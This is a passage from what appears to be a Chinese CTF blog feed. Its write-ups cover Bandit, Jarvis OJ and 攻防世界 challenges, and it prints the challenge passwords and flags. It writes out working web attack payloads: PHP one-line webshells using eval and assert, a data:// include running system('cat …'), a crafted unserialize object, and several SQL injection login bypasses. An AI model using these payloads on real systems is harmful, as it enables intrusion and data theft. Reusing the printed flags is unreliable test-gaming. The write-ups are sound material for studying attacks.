.i.h?X.0.......$000001f0: 177b fe66 c676 01f0 a5bc 9131 6746 cc85  .{.f.v.....1gF..00000200: 1a39 e46f 6b9a 7bd4 694b e999 c300 b57e  .9.ok.{.iK.....~00000210: 9b0a 1229 fac1 cc0c 24fb a905 a06a b8cf  ...)....$....j..00000220: cb56 2a73 6016 6950 8208 5785 af54 0d42  .V*s`.iP..W..T.B00000230: 754e 5a48 8835 2b47 aa9b c45e 4ca8 a7a0  uNZH.5+G...^L...00000240: 61dd e070 7717 9346 5f14 d808 8263 7746  a..pw..F_....cwF00000250: 5100 3af8 fa20 ff8b b922 9c28 4818 1f0d  Q.:.. ...&quot;.(H...00000260: a000 e793 1e61 4902 0000                 .....aI...data_1: ASCII textbandit12@bandit:/tmp/Crayon123$ xxd -r data_1 &gt; data_2 ; file data_2data_2: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data_2 data_3.gz ;bandit12@bandit:/tmp/Crayon123$ gzip -d data_3.gz ;bandit12@bandit:/tmp/Crayon123$ lsdata_1  data_3bandit12@bandit:/tmp/Crayon123$ file data_3data_3: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/Crayon123$ mv data_3 data_4.bz2 ; bzip2 -d data_4.bz2 ;bandit12@bandit:/tmp/Crayon123$ lsdata_1  data_4bandit12@bandit:/tmp/Crayon123$ file data_4data_4: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data_4 data_5.gz ; gzip -d data_5.gz  bandit12@bandit:/tmp/Crayon123$ lsdata_1  data_5bandit12@bandit:/tmp/Crayon123$ file data_5data_5: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data_5 data_6.tar ; tar -xvf data_6.tardata5.binbandit12@bandit:/tmp/Crayon123$ lsdata5.bin  data_1  data_6.tarbandit12@bandit:/tmp/Crayon123$ file data5.bin data5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data5.bin data_7.tar; tar -xvf data_7.tardata6.binbandit12@bandit:/tmp/Crayon123$ file data6.bin data6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/Crayon123$ mv data6.bin data_8.bz2 ; bzip2 -d data_8.bz2bandit12@bandit:/tmp/Crayon123$ lsdata_1  data_6.tar  data_7.tar  data_8bandit12@bandit:/tmp/Crayon123$ file data_8data_8: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data_8 data_9.tar ; tar -xvf data_9.tardata8.binbandit12@bandit:/tmp/Crayon123$ lsdata8.bin  data_1  data_6.tar  data_7.tar  data_9.tarbandit12@bandit:/tmp/Crayon123$ file data8.bin data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data8.bin data_10.gz ; gzip -d data_10.gzbandit12@bandit:/tmp/Crayon123$ lsdata_1  data_10  data_6.tar  data_7.tar  data_9.tarbandit12@bandit:/tmp/Crayon123$ file data_10data_10: ASCII textbandit12@bandit:/tmp/Crayon123$ cat data_10The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL其实这一题并不是很难，一步一步看解题过程就明白怎么回事了，文件最开始是16进制，用” xxd -r”将16进制文件转换为二进制文件，然后每一步都查看一次文件类型，并重命名为相应的文件类型，主要运用”bzip2 -d”,”gzip -d”,”tar -xvf”以及`这些解压方法。</code></pre><p>密码：</p><blockquote><blockquote><blockquote><p>yCRiBWFYkneahHwxCv3wb2a1ORpYL</p></blockquote></blockquote></blockquote>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarvis OJ 神盾局的秘密</title>
    <link href="/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <url>/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p>神盾局的秘密<br>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a><br>题目提示:</p><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p><p>访问链接之后，得到就是一张图片，通过burp抓包，发现在中途访问了网址<a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。</a><br>读取showimg.php的内容:</p><pre><code>&lt;?php    $f = $_GET[&#39;img&#39;];    if (!empty($f)) {        $f = base64_decode($f);        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) {            readfile($f);        } else {            echo &quot;File not found!&quot;;        }    }?&gt;</code></pre><p>普通的内容，没有与Flag相关的信息。<br>尝试读取index.php的信息:</p><pre><code>&lt;?php     require_once(&#39;shield.php&#39;);    $x = new Shield();    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];    if (!empty($g)) {        $x = unserialize($g);    }    echo $x-&gt;readfile();?&gt;</code></pre><p>index.php也没有出现与Flag相关的信息，但是index.php读取的class参数的值，并且没有对参数进行过滤。<br>读取shield.php信息：</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = &#39;&#39;) {            $this -&gt; file = $filename;        }      function readfile() {          if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {              return @file_get_contents($this-&gt;file);          }      }  }</code></pre><p>  ?&gt;<br>说明了Flag在pctf.php中，结合index.php的源代码。得到最后的Flag信息。但是我们需要一个Shield类的实例$X,实例$x中的file属性为pctf.php。但是目前的代码无法做到这一点。但是想了很久都没有想到，最后请教了40huo。最后知道需要本地搭建环境，对示例进行序列话。<br>index.php</p><pre><code>&lt;?php    require_once(&#39;shield.php&#39;);    $x = new Shield();    echo serialize($x);?&gt;</code></pre><p>  shield.php</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = &#39;pctf.php&#39;) {            $this -&gt; file = $filename;        }        function readfile() {            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE              &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {                return @file_get_contents($this-&gt;file);            }        }    }?&gt;</code></pre><p>最关键的代码就是,在进行初始化的时候，将$filename赋值为pctf.php</p><pre><code>function __construct($filename = &#39;pctf.php&#39;) {    $this -&gt; file = $filename;}</code></pre><p>最后得到的序列话的值是：</p><pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>最后访问URL:<a href="http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</a><br>页面返回:</p><pre><code>&lt;?php     //Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}    //Fake flag:    echo &quot;FLAG: PCTF{I_4m_not_fl4g}&quot;?&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>Jarvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python模板注入</title>
    <link href="/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">https://www.freebuf.com/column/187845.html</a></p><p>攻防世界中模板注入例题的wp:<a href="https://blog.csdn.net/qq_40884727/article/details/101605002" target="_blank" rel="noopener">https://blog.csdn.net/qq_40884727/article/details/101605002</a></p><p><a href="https://blog.csdn.net/qq_17204441/article/details/102857726" target="_blank" rel="noopener">https://blog.csdn.net/qq_17204441/article/details/102857726</a></p>]]></content>
    
    
    <categories>
      
      <category>WEB，python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界web进阶区Web_php_include</title>
    <link href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
    <url>/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p><img src="/img/php1.png" srcset="/img/loading.gif" alt=""></p><p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p><p>那就利用大小写绕过输入：</p><blockquote><blockquote><p>?page=phP://input</p></blockquote></blockquote><p><img src="/img/php2.png" srcset="/img/loading.gif" alt=""><br>图片里我忘记打成大写了。</p><p><img src="/img/php3.png" srcset="/img/loading.gif" alt=""></p><p>直接访问flag发现一片空白。</p><p><img src="/img/php4.png" srcset="/img/loading.gif" alt=""></p><p>那就继续在burp里用cat命令访问，成功取得flag。</p><p>事后观看其他人的思路还可以用data直接查看：</p><blockquote><blockquote><p>?page=data:text/plain,<?php%20system("cat%20fl4gisisish3r3.php");?></p></blockquote></blockquote><p>或者麻烦一点用菜刀也可以做出来。</p>]]></content>
    
    
    <categories>
      
      <category>攻防世界，web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB，upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界upload1总结</title>
    <link href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/"/>
    <url>/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="攻防世界web进阶区upload1"><a href="#攻防世界web进阶区upload1" class="headerlink" title="攻防世界web进阶区upload1"></a>攻防世界web进阶区upload1</h1><p>打开题目网站，直接出现了一个上传的界面，试着直接点一个php文件进行上传。发现上传的那个按钮直接变灰，无法点击。于是又点了一个1.jpg文件。</p><blockquote><blockquote><blockquote><?php phpinfo();?></blockquote></blockquote></blockquote><p>然后上传用burp suite进行拦截直接改名为php。发现上传成功。并且页面显示上传文件后的路径，进行访问。<br>果真显示了phpinfo的界面<br><img src="/img/caidao3.png" srcset="/img/loading.gif" alt=""><br>嗯。。。。那就用菜刀进行连接，传一个一句话代码。</p><blockquote><blockquote><blockquote><?php @eval($_POST['caidao']);?></blockquote></blockquote></blockquote><p>然后打开菜刀进行连接。额。。。。失败了。<br>然后进行百度发现我传入菜刀时，忘记修改后缀名，将jpg改成php。</p><p><img src="/img/caidao2.png" srcset="/img/loading.gif" alt=""><br><img src="/img/caidai1.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>攻防世界，web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB，upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>__wakeup漏洞绕过</title>
    <link href="/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/"/>
    <url>/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="wakeup-函数用法"><a href="#wakeup-函数用法" class="headerlink" title="__wakeup()函数用法"></a>__wakeup()函数用法</h2><p><strong>wakeup()是用在反序列化操作中。unserialize()会检查存在一个</strong>wakeup()方法。如果存在，则先会调用__wakeup()方法。</p><pre><code>&lt;?phpclass A{function __wakeup(){echo &#39;Hello&#39;;}}$c = new A();$d=unserialize(&#39;O:1:&quot;A&quot;:0:{}&#39;);?&gt;</code></pre><p>最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello<br>__wakeup()函数漏洞说明</p><pre><code>&lt;?phpclass Student{public $full_name = &#39;zhangsan&#39;;public $score = 150;public $grades = array();function __wakeup() {echo &quot;__wakeup is invoked&quot;;}}$s = new Student();var_dump(serialize($s));?&gt;</code></pre><p>最后页面上输出的就是Student对象的一个序列化输出，<br>O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}。其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br><strong>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过</strong>wakeup的执行。<br>当我们将上述的序列化的字符串中的对象属性修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}。<br>最后执行运行的代码如下：</p><pre><code>class Student{public $full_name = &#39;zhangsan&#39;;public $score = 150;public $grades = array();function __wakeup() {echo &quot;__wakeup is invoked&quot;;}function __destruct() {var_dump($this);}}$s = new Student();$stu = unserialize(&#39;O:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}&#39;);</code></pre><p>可以看到这样就成功地绕过了__wakeup()函数。</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入(一）</title>
    <link href="/2019/12/22/SQL%E6%B3%A8%E5%85%A5(%E4%B8%80)/"/>
    <url>/2019/12/22/SQL%E6%B3%A8%E5%85%A5(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h2 id="万能密码—very-easy"><a href="#万能密码—very-easy" class="headerlink" title="万能密码—very easy"></a>万能密码—very easy</h2><p>题目入口：<a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php</a> </p><p>题目来源：hacking lab inject 01~</p><p><img src="/img/1.jpg" srcset="/img/loading.gif" alt=""></p><p>源代码有提示：</p><blockquote><p>&lt;!--ps login as admin–&gt;</p></blockquote><p>万能密码登录语句构造： </p><p>select * from admin where username=’admin’and 1=1 #’ and password=’123456′ </p><p>OR </p><p>select * from admin where username=’admin’or 1 #’ and password=’123456′ </p><p>或者不需要admin </p><p>select * from admin where username=’1′or 1 or 1 #’ and password=’123456′ </p><p>还可以用#来注释 </p><p>select * from admin where username=’admin’#’ and password=’123456′</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>题目入口：<a href="http://redtiger.labs.overthewire.org/level2.php" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org/level2.php</a> </p><p>题目来源：RedTigers Hackit Level 2 Simple login-bypass </p><p>做题密码：4_is_not_random </p><p>构造语句： </p><p>username=1&amp;password=1′or’1′or’1&amp;login=Login</p><p> pass.png</p><h2 id="万能密码–-not-easy"><a href="#万能密码–-not-easy" class="headerlink" title="万能密码– not easy"></a>万能密码– not easy</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a> </p><p>题目来源：实验吧，不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!</p><p>常规方式使用万能密码，发现’没有被过滤，or，–+，#被过滤。</p><p><img src="/img/2.jpg" srcset="/img/loading.gif" alt=""></p><p>假设后台sql查询语句为： </p><p>select * from user where username=’$user’ and password=’$pass’ </p><p>构造payload： </p><p>username=reborn’=’&amp;password=reborn’=’</p><p> <img src="/img/3.jpg" srcset="/img/loading.gif" alt=""></p><pre><code>select * from user where username=’reborn’=” and password=’reborn’=”</code></pre><p>username=’reborn’返回值为0，相当于false，然后0=”的结果为1，相当于true。 </p><p>所以注入语句相当于：</p><pre><code>select * from user where 1 and 1</code></pre><h2 id="万能密码—-little-hard"><a href="#万能密码—-little-hard" class="headerlink" title="万能密码— little hard ?"></a>万能密码— little hard ?</h2><p>题目入口：<a href="http://123.59.52.228:1515/route.php?act=index" target="_blank" rel="noopener">http://123.59.52.228:1515/route.php?act=index</a> </p><p>题目来源：2017年全国大学生信息安全竞赛的web题。</p><p><img src="/img/4.jpg" srcset="/img/loading.gif" alt=""></p><p>提交的时候，返回包有提示这么一个sql语句： </p><pre><code>select count(*) from t_info where username = ’1′ or nickname = ’1′ </code></pre><p>‘ 转义 \ </p><p>\ 转义 \ </p><p>” 转义 \” </p><p>空格被过滤：但’可以转义掉原本的’ </p><pre><code>name=or 1 #’&amp;submit=check select count(*) from t_info where username = ‘or1#\’ or nickname = ‘or1#\’ </code></pre><p>用%09代替空格，%09是制表符的URL编码 </p><pre><code>name=or%091%09#’&amp;submit=check select count(*) from t_info where username = ‘or 1 #\’ or nickname = ‘or 1 #\’good job </code></pre><p>跟随302跳转。</p><h2 id="万能密码—-md5-pass-true"><a href="#万能密码—-md5-pass-true" class="headerlink" title="万能密码— md5($pass,true)"></a>万能密码— md5($pass,true)</h2><p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a> </p><p>题目来源：jarvis oj，Login：需要密码才能获得flag哦。</p><p>本题是一个登录页面。</p><p><img src="/img/5.jpg" srcset="/img/loading.gif" alt=""></p><p>通过burp抓包拦截，返回包有提示：</p><p> tishi.png</p><pre><code>Hint: “select * from `admin` where password=’”.md5($pass,true).”‘”</code></pre><ul><li>md5(string,raw)* </li></ul><p>string 必需。规定要计算的字符串。 </p><p>raw 可选。规定十六进制或二进制输出格式： </p><p>•  TRUE – 原始 16 字符二进制格式</p><p>•  FALSE – 默认。32 字符十六进制数如果md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串，则拼接后构成的语句为：</p><pre><code>select * from `admin` where password=”or’xxx’</code></pre><p>下面提供两个payload： </p><p>content: 129581926211651571912466741651878684928 </p><p>hex: 06da5430449f8f6f23dfc1276f722738 </p><p>raw: ?T0D??o#??’or’8.N=?</p><p>content: ffifdyop </p><p>hex: 276f722736c95d99e921722cf9ed621c </p><p>raw: ‘or’6蒥欓!r,b </p><p>类似题目： </p><p>题目入口：<a href="http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/" target="_blank" rel="noopener">http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/</a> </p><p>题目来源：hacking lab inject 09~ </p><pre><code>看到源代码password=’”.md5($_GET[&#39;pwd&#39;], true)，就知道这道题和题目3的解法是一致的。 http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;pwd=ffifdyop</code></pre><h2 id="万能密码—-with-rollup"><a href="#万能密码—-with-rollup" class="headerlink" title="万能密码— with rollup"></a>万能密码— with rollup</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a> </p><p>题目来源：实验吧 </p><p>访问链接是登录页面：</p><p><img src="/img/6.jpg" srcset="/img/loading.gif" alt=""></p><p>查看网页源代码有提示：</p><p><img src="/img/7.jpg" srcset="/img/loading.gif" alt=""></p><p>访问：<a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/source.txt</a> 得到题目源代码：</p><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {    echo ‘&lt;form action=”&quot; method=”post”&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input name=”uname” type=”text”/&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input name=”pwd” type=”text”/&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input type=”submit” /&gt;’.”&lt;br/&gt;”;    echo ‘&lt;/form&gt;’.”&lt;br/&gt;”;    echo ‘&lt;!–source: source.txt–&gt;’.”&lt;br/&gt;”;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){        $StrValue=implode($StrValue);    }    if (preg_match(“/”.$ArrReq.”/is”,$StrValue)==1){           print “水可载舟，亦可赛艇！”;        exit();    }}$filter = “and|select|from|where|union|join|sleep|benchmark|,|\(|\)”;foreach($_POST as $key=&gt;$value){     AttackFilter($key,$value,$filter);}$con = mysql_connect(“XXXXXX”,”XXXXXX”,”XXXXXX”);if (!$con){    die(‘Could not connect: ‘ . mysql_error());}$db=”XXXXXX”;mysql_select_db($db, $con);$sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[&#39;uname&#39;]}’”;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) {     $key = mysql_fetch_array($query);    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print “CTF{XXXXXX}”;    }else{        print “亦可赛艇！”;    }}else{    print “一颗赛艇！”;}mysql_close($con);?&gt;</code></pre><p>从源代码得出，注入点在uname这个位置上，$filter没有过滤掉 or </p><p>注入成功要满足几个条件：</p><ol><li><p>mysql_num_rows($query) == 1 即查询返回的结果行数为1</p></li><li><p>$key[‘pwd’] == $_POST[‘pwd’] 即查询返回的结果与POST发送的pwd值相同</p></li></ol><p>解题： </p><p>group by pass with rollup 的技巧</p><pre><code>mysql&gt; select user from users group by user;+———+| user    |+———+| 1337    || admin   || gordonb || pablo   || smithy  |+———+5 rows in setmysql&gt; select user from users group by user with rollup;+———+| user    |+———+| 1337    || admin   || gordonb || pablo   || smithy  || NULL    |+———+6 rows in set</code></pre><p>可以发现，在加上with rollup之后，返回pass最后一行多了一个NULL。当我们POST的pass为空，即可满足$key[‘pwd’] == $_POST[‘pwd’]条件。</p><p>如何让返回的结果只取最后一行呢？ </p><p>因为过滤了,所以无法使用limit 5,1这样的语法 </p><p>可以使用limit 1 offset 5</p><p>mysql&gt; select user from users group by 1 with rollup limit 1 offset 5;</p><p>+——+</p><p>| user |</p><p>+——+</p><p>| NULL |</p><p>+——+</p><p>1 row in set</p><p>所以最终 payload 如下，2为遍历出来的值 。</p><p>uname=’ or 1=1 group by pwd with rollup limit 1 offset 2#&amp;pwd=</p><h2 id="万能密码—-程序逻辑"><a href="#万能密码—-程序逻辑" class="headerlink" title="万能密码— 程序逻辑"></a>万能密码— 程序逻辑</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.php</a> </p><p>题目来源：实验吧，程序逻辑问题 </p><p>本题源代码：<a href="http://ctf5.shiyanbar.com/web/5/index.txt" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.txt</a></p><pre><code>&lt;html&gt;&lt;head&gt;welcome to simplexue&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) {    $conn = mysql_connect(“********, “*****”, “********”);    mysql_select_db(“phpformysql”) or die(“Could not select database”);    if ($conn-&gt;connect_error) {        die(“Connection failed: ” . mysql_error($conn));} $user = $_POST[user];$pass = md5($_POST[pass]);$sql = “select pw from php where user=’$user’”;$query = mysql_query($sql);if (!$query) {    printf(“Error: %s\n”, mysql_error($conn));    exit();}</code></pre><p>$row = mysql_fetch_array($query, MYSQL_ASSOC);</p><pre><code>//echo $row[&quot;pw&quot;];  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo “&lt;p&gt;Logged in! Key:************** &lt;/p&gt;”;}else {    echo(“&lt;p&gt;Log in failure!&lt;/p&gt;”);  }}?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=”Username”&gt;&lt;input type=password name=pass value=”Password”&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=”index.txt”&gt;&lt;/html&gt;</code></pre><p>首先可以发现user处存在注入点，并且会回显错误信息，第一个想到的是报错注入。</p><pre><code>user=admin’and (extractvalue(1,concat(0x7e,(select pw from php where user =’admin’ limit 0,1),0x7e)))#&amp;pass=111</code></pre><p>结果密码并不是admin/111</p><pre><code>user=admin’and (extractvalue(1,concat(0x7e,(select pw from phpformysql.php limit 0,1),0x7e)))#&amp;pass=111</code></pre><p>结果提示：</p><p><img src="/img/8.jpg" srcset="/img/loading.gif" alt=""></p><p>既然是程序逻辑漏洞，然就继续看代码吧。</p><pre><code>if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo “&lt;p&gt;Logged in! Key:************** &lt;/p&gt;”;}</code></pre><p>判断sql查询返回的值和$pass做比较。strcasecmp比较两个字符串，且不区分大小写，相等返回0。 </p><p>既然user存在注入，我们可以让返回的结果为任何值，只要等于我们输入pass的md5值。 </p><p>如：reborn的md5加密的值为5ce3c6e5c3f84bdc0f45148adfd16ae6 </p><p>因此我们可以构造payload： </p><p>user=’union select ’5ce3c6e5c3f84bdc0f45148adfd16ae6′#&amp;pass=reborn </p><p>结果：<br><img src="/img/9.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarvis OJ admin</title>
    <link href="/2019/12/22/Jarvis-OJ-admin/"/>
    <url>/2019/12/22/Jarvis-OJ-admin/</url>
    
    <content type="html"><![CDATA[<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><hr><p>题目链接：http ://web.jarvisoj.com:32792 /</p><p>点开页面后是一个hello world，看了看F12什么都没发现，用bp也没发现什么东西。用御剑先扫一波，马上发现了robots.txt。</p><a id="more"></a><p>进去后出现了：</p><blockquote><p>Disallow: /admin_s3cr3t.php</p></blockquote><p>激动的点开了网站</p><p><img src="/img/1.png" srcset="/img/loading.gif" alt=""></p><p>提交以后发现是错的。<br>再次进入网站用bp拦截，发现cookie的值是</p><blockquote><p>admin = 0</p></blockquote><p>将0改成1.出现flag。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web，JARvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码漏洞（一）</title>
    <link href="/2019/12/22/PHP%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2019/12/22/PHP%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>mixed eval ( string $code )<br>把字符串code作为php代码执行。常见的一句话木马：</p><a id="more"></a><p>（<code>)&lt;?php    eval($_GET[&#39;pass&#39;])?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://xxx/codeexec.php?pass=phpinfo()" target="_blank" rel="noopener">http://xxx/codeexec.php?pass=phpinfo()</a>;</p></blockquote><p>得到phpinfo()页面。</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p>PHP 5</p><p>bool assert ( mixed $assertion [, string $description ] )<br>PHP 7</p><p>bool assert ( mixed $assertion [, Throwable $exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p><p>一句话木马：<br>(<code>)&lt;?php    assert($_GET[&#39;pass&#39;]);?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://xxx/codeexec.php?pass=phpinfo()" target="_blank" rel="noopener">http://xxx/codeexec.php?pass=phpinfo()</a></p></blockquote><p>phpinfo()后可以不用分号。得到phpinfo()页面。</p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )<br>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：php-preg_replace</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" 